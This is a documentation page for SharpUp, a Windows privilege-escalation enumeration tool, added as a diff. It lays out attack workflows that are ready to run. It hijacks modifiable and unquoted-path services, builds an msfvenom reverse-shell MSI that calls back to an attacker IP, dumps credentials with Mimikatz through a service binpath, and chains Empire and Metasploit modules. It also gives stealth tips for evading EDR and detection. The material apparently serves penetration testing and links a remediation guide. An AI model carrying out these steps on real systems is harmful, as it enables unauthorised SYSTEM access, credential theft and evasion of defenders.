@@ -1,0 +1,487 @@
+---
+title: 'Practical Usage'
+description: 'Real-world workflows and usage examples for SharpUp'
+icon: 'terminal'
+---
+
+## Overview
+
+SharpUp is a privilege escalation enumeration tool that identifies common Windows misconfigurations and vulnerabilities. This guide provides practical workflows for different scenarios.
+
+## Common Workflows
+
+### Workflow 1: Initial System Enumeration
+
+When you first gain access to a Windows system as a non-privileged user:
+
+```bash
+# Run all checks to identify privilege escalation opportunities
+SharpUp.exe
+```
+
+**What happens:**
+1. SharpUp checks if you're already in high integrity or local administrator
+2. If not, it runs all 15 vulnerability checks
+3. Results are displayed showing vulnerable configurations
+4. You can then target specific vulnerabilities for exploitation
+
+### Workflow 2: Comprehensive Security Audit
+
+For security assessments where you need to identify all potential issues:
+
+```bash
+# Run all checks in audit mode
+SharpUp.exe audit
+```
+
+**Use cases:**
+- Security audits and compliance checks
+- Vulnerability assessments
+- Finding all potential escalation paths
+- Documenting system weaknesses
+
+**Note:** Running in high integrity will produce more results but may include false positives.
+
+### Workflow 3: Targeted Service Exploitation
+
+Focus on service-related privilege escalation vectors:
+
+```bash
+# Check for service vulnerabilities only
+SharpUp.exe ModifiableServices ModifiableServiceBinaries ModifiableServiceRegistryKeys UnquotedServicePath
+```
+
+**What this finds:**
+- Services with weak permissions
+- Service binaries you can modify
+- Service registry keys you can change
+- Unquoted service paths you can exploit
+
+**Follow-up actions:**
+- Review the [Modifiable Services](/GhostPack/SharpUp-mdx/checks/modifiableservices) check for exploitation
+- See [Unquoted Service Path](/GhostPack/SharpUp-mdx/checks/unquotedservicepath) for hijacking techniques
+
+### Workflow 4: Credential Hunting
+
+Search for plaintext credentials and password storage issues:
+
+```bash
+# Look for stored credentials
+SharpUp.exe audit CachedGPPPassword DomainGPPPassword RegistryAutoLogons UnattendedInstallFiles McAfeeSitelistFiles
+```
+
+**What this finds:**
+- GPP passwords in cached policy files or SYSVOL
+- Auto-logon credentials in registry
+- Credentials in unattended install files
+- McAfee SiteList.xml files with encrypted credentials
+
+**Follow-up actions:**
+- Extract and decrypt found credentials
+- Use credentials for lateral movement
+- Escalate privileges if credentials belong to privileged users
+
+### Workflow 5: Registry-Based Escalation
+
+Target registry misconfigurations:
+
+```bash
+# Check registry vulnerabilities
+SharpUp.exe audit RegistryAutoruns RegistryAutoLogons AlwaysInstallElevated
+```
+
+**What this finds:**
+- Modifiable autorun binaries
+- Auto-logon credentials
+- AlwaysInstallElevated policy misconfigurations
+
+**Follow-up actions:**
+- Replace autorun binaries with malicious versions
+- Use auto-logon credentials
+- Create malicious MSI installers if AlwaysInstallElevated is set
+
+### Workflow 6: DLL Hijacking Opportunities
+
+Identify DLL hijacking possibilities:
+
+```bash
+# Check for hijackable DLLs and PATH folders
+SharpUp.exe audit ProcessDLLHijack HijackablePaths
+```
+
+**What this finds:**
+- Writable DLLs loaded by privileged processes
+- Modifiable folders in system PATH
+
+**Follow-up actions:**
+- Replace vulnerable DLLs
+- Place malicious executables in modifiable PATH folders
+- Wait for privileged processes to load your code
+
+## Scenario-Based Examples
+
+<AccordionGroup>
+  <Accordion title="Scenario: Domain Joined Workstation">
+    ```bash
+    # 1. Run initial enumeration
+    SharpUp.exe
+
+    # 2. If you find DomainGPPPassword vulnerability
+    SharpUp.exe DomainGPPPassword
+
+    # 3. Look for cached credentials
+    SharpUp.exe audit CachedGPPPassword RegistryAutoLogons
+    ```
+
+    **Why this works:**
+    - Domain environments often have GPP passwords in SYSVOL
+    - Cached policies may contain old GPP credentials
+    - Auto-logon may be configured for service accounts
+  </Accordion>
+
+  <Accordion title="Scenario: Standalone Workstation">
+    ```bash
+    # 1. Focus on local misconfigurations
+    SharpUp.exe ModifiableServices UnquotedServicePath AlwaysInstallElevated
+
+    # 2. Check for stored credentials
+    SharpUp.exe audit UnattendedInstallFiles RegistryAutoLogons
+
+    # 3. Look for file-based vulnerabilities
+    SharpUp.exe HijackablePaths ProcessDLLHijack
+    ```
+
+    **Why this works:**
+    - Standalone systems rely on local services
+    - May have remnants from unattended installations
+    - PATH and DLL hijacking are common on workstations
+  </Accordion>
+
+  <Accordion title="Scenario: Server Environment">
+    ```bash
+    # 1. Check token privileges first
+    SharpUp.exe TokenPrivileges
+
+    # 2. Look for service misconfigurations
+    SharpUp.exe audit ModifiableServices ModifiableServiceRegistryKeys ModifiableServiceBinaries
+
+    # 3. Check scheduled tasks
+    SharpUp.exe ModifiableScheduledTask
+    ```
+
+    **Why this works:**
+    - Servers often have special privileges assigned
+    - Many services run on servers
+    - Scheduled tasks are common for automation
+  </Accordion>
+
+  <Accordion title="Scenario: Limited User Context">
+    ```bash
+    # 1. Start with non-privileged checks
+    SharpUp.exe
+
+    # 2. If nothing found, try audit mode for more thorough check
+    SharpUp.exe audit
+
+    # 3. Focus on user-level vulnerabilities
+    SharpUp.exe audit RegistryAutoruns HijackablePaths ProcessDLLHijack
+    ```
+
+    **Why this works:**
+    - Some checks work better with limited privileges
+    - Audit mode may reveal additional opportunities
+    - User-level checks don't require admin access
+  </Accordion>
+</AccordionGroup>
+
+## Interpreting Results
+
+### Understanding Output Format
+
+```
+=== Check Name ===
+    Detail 1
+    Detail 2
+    ...
+```
+
+Each vulnerable finding is grouped by check type, with specific details about the vulnerability.
+
+### Example Output Analysis
+
+<Tabs>
+  <Tab title="Service Vulnerabilities">
+    ```
+    === Modifiable Services ===
+        Service 'VulnSvc' (State: Running, StartMode: Automatic)
+    ```
+
+    **What this means:**
+    - You have permissions to modify the VulnSvc service
+    - The service is currently running
+    - It starts automatically (will restart on reboot)
+
+    **Next steps:**
+    - Use `sc config` to change the service binary path
+    - Restart the service or reboot to execute your code
+    - See [Modifiable Services](/GhostPack/SharpUp-mdx/checks/modifiableservices) for details
+  </Tab>
+
+  <Tab title="Unquoted Paths">
+    ```
+    === Services with Unquoted Paths ===
+        Service 'MyApp' (StartMode: Automatic) has executable 'C:\Program Files\My App\service.exe', but 'C:\Program' is modifiable.
+    ```
+
+    **What this means:**
+    - Service path is not quoted and contains spaces
+    - Windows will try C:\Program.exe before the actual path
+    - You have write access to place a malicious Program.exe
+
+    **Next steps:**
+    - Create malicious Program.exe
+    - Place it in C:\
+    - Restart service or reboot
+    - See [Unquoted Service Path](/GhostPack/SharpUp-mdx/checks/unquotedservicepath) for details
+  </Tab>
+
+  <Tab title="Registry Credentials">
+    ```
+    === Registry AutoLogons ===
+        DefaultDomainName: CONTOSO
+        DefaultUserName: Administrator
+        DefaultPassword: P@ssw0rd123!
+    ```
+
+    **What this means:**
+    - Auto-logon is configured
+    - Plaintext administrator credentials are in the registry
+    - You can use these credentials immediately
+
+    **Next steps:**
+    - Use credentials for privilege escalation
+    - Use RunAs, PSExec, or PsExec to execute as that user
+    - See [Registry AutoLogons](/GhostPack/SharpUp-mdx/checks/registryautologons) for details
+  </Tab>
+
+  <Tab title="Token Privileges">
+    ```
+    === Abusable Token Privileges ===
+        SeImpersonatePrivilege: Enabled
+        SeDebugPrivilege: Enabled, Default
+    ```
+
+    **What this means:**
+    - Your process has SeImpersonatePrivilege enabled
+    - You also have SeDebugPrivilege (default state)
+    - These can be abused for privilege escalation
+
+    **Next steps:**
+    - Use Juicy Potato, Rotten Potato, or similar for SeImpersonate
+    - Use SeDebugPrivilege to access LSASS or other privileged processes
+    - See [Token Privileges](/GhostPack/SharpUp-mdx/checks/tokenprivileges) for details
+  </Tab>
+</Tabs>
+
+## Practical Exploitation Examples
+
+### Example 1: Exploiting Modifiable Service
+
+```bash
+# 1. Identify vulnerable service
+SharpUp.exe ModifiableServices
+# Output: Service 'VulnSvc' (State: Running, StartMode: Automatic)
+
+# 2. Change service binary path to your payload
+sc config VulnSvc binpath= "C:\temp\payload.exe"
+
+# 3. Restart the service
+sc stop VulnSvc
+sc start VulnSvc
+
+# 4. Service runs your payload with SYSTEM privileges
+```
+
+### Example 2: Exploiting Unquoted Service Path
+
+```bash
+# 1. Identify vulnerable service
+SharpUp.exe UnquotedServicePath
+# Output: Service 'MyApp' has path 'C:\Program Files\My App\service.exe'
+
+# 2. Create malicious executable
+# (Create your payload as Program.exe)
+
+# 3. Place executable in the exploitable location
+copy payload.exe "C:\Program.exe"
+
+# 4. Restart service or reboot
+shutdown /r /t 0
+```
+
+### Example 3: Using AlwaysInstallElevated
+
+```bash
+# 1. Check if policy is enabled
+SharpUp.exe AlwaysInstallElevated
+# Output: HKLM: 1, HKCU: 1
+
+# 2. Create malicious MSI installer
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o payload.msi
+
+# 3. Install MSI with elevated privileges
+msiexec /quiet /qn /i C:\temp\payload.msi
+
+# 4. MSI installs and runs with SYSTEM privileges
+```
+
+### Example 4: Leveraging Registry Autoruns
+
+```bash
+# 1. Find modifiable autorun
+SharpUp.exe RegistryAutoruns
+# Output: HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Tools\app.exe
+
+# 2. Replace the executable with your payload
+copy payload.exe C:\Tools\app.exe
+
+# 3. Wait for system reboot or user logon
+# Your payload will execute with appropriate privileges
+```
+
+## Integration with Other Tools
+
+### Combining with Mimikatz
+
+```bash
+# 1. Use SharpUp to identify service vulnerabilities
+SharpUp.exe ModifiableServices
+
+# 2. Exploit service to gain SYSTEM
+sc config VulnSvc binpath= "C:\tools\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
+
+# 3. Restart service to dump credentials
+sc stop VulnSvc && sc start VulnSvc
+```
+
+### Combining with PowerShell Empire
+
+```powershell
+# 1. Load SharpUp in Empire
+execute-assembly /path/to/SharpUp.exe audit
+
+# 2. Use results to select exploitation module
+usemodule privesc/powerup/service_exe_useradd
+
+# 3. Configure with findings from SharpUp
+set ServiceName VulnSvc
+execute
+```
+
+### Combining with Metasploit
+
+```bash
+# 1. Run SharpUp on target
+execute -f SharpUp.exe -a "audit"
+
+# 2. Use findings with Metasploit modules
+use exploit/windows/local/service_permissions
+set SESSION 1
+set SERVICE_NAME VulnSvc
+run
+```
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Start Broad" icon="binoculars">
+    Begin with a full SharpUp scan to identify all potential vectors before focusing on specific checks.
+  </Card>
+  <Card title="Prioritize Quick Wins" icon="bolt">
+    Target easily exploitable vulnerabilities first (registry credentials, AlwaysInstallElevated).
+  </Card>
+  <Card title="Document Findings" icon="file-lines">
+    Save SharpUp output for reporting and tracking which vectors you've attempted.
+  </Card>
+  <Card title="Chain Techniques" icon="link">
+    Combine multiple vulnerabilities to increase success rate and maintain persistence.
+  </Card>
+</CardGroup>
+
+## Operational Considerations
+
+<Warning>
+  Consider the following when using SharpUp in live environments:
+</Warning>
+
+### Stealth Considerations
+
+- **File Naming:** Rename SharpUp.exe to something innocuous
+- **Execution Method:** Use in-memory execution when possible
+- **Targeted Checks:** Run specific checks instead of all checks to reduce noise
+- **Timing:** Avoid running during business hours for stealth operations
+
+### Environmental Awareness
+
+- **Domain vs Standalone:** Tailor your checks to the environment type
+- **Server vs Workstation:** Different check priorities based on system role
+- **Patching Level:** Older systems may have more vulnerabilities
+- **Security Tools:** Be aware of EDR/AV that may detect enumeration
+
+## Troubleshooting Common Issues
+
+<AccordionGroup>
+  <Accordion title="No Vulnerabilities Found">
+    **Possible reasons:**
+    - System is properly hardened
+    - Running with insufficient permissions
+    - Specific configurations not present
+    - Need to use audit mode
+
+    **Try:**
+    ```bash
+    SharpUp.exe audit
+    ```
+  </Accordion>
+
+  <Accordion title="Access Denied on Specific Checks">
+    **Common with:**
+    - ProcessDLLHijack (needs access to process modules)
+    - ModifiableScheduledTask (needs access to tasks folder)
+    - Domain checks (needs domain connectivity)
+
+    **Solution:**
+    - This is expected in some contexts
+    - Try with higher privileges if available
+    - Focus on checks that work in your context
+  </Accordion>
+
+  <Accordion title="False Positives in Audit Mode">
+    **Why it happens:**
+    - Running in high integrity shows more results
+    - Some checks assume low-privilege context
+    - Access control checks behave differently when elevated
+
+    **Solution:**
+    - Run without audit mode for accurate results
+    - Manually verify findings before exploitation
+    - Understand which checks are context-dependent
+  </Accordion>
+</AccordionGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Check Documentation" icon="list" href="/ghostpack-docs/SharpUp-mdx/checks/alwaysinstallelevated">
+    Detailed documentation for each vulnerability check
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Learn how to fix identified vulnerabilities
+  </Card>
+  <Card title="Compilation Guide" icon="hammer" href="/ghostpack-docs/SharpUp-mdx/compilation">
+    Build and configure SharpUp
+  </Card>
+  <Card title="PowerUp (PowerShell)" icon="book" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1">
+    Original PowerShell implementation
+  </Card>
+</CardGroup>
